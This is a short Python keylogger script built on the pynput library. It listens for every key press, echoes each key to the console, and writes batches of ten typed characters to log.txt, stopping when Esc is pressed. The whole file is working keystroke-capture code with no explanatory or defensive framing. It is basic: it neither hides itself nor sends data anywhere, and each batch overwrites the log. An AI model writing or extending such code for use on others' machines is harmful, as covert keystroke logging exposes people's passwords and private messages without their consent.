import pynput # pip install pynput
from pynput.keyboard import Key, Listener

count = 0
keys = []

def press(key):
    global keys, count

    keys.append(key)
    count +=1
    print("{0} pressed".format(key))

    if count >= 10:
        count = 0
        write(keys)
        keys = []


def write(keys):
    with open("log.txt", "w") as f:
        for key in keys:
            k = str(key).replace("'","")
            if k.find("space") >0:
                f.write("\n")
            elif k.find("Key") == -1:
                f.write(k)




def release(key):
    if key == Key.esc:
        return False


with Listener(on_press=press, on_release=release) as listener:
    listener.join()
    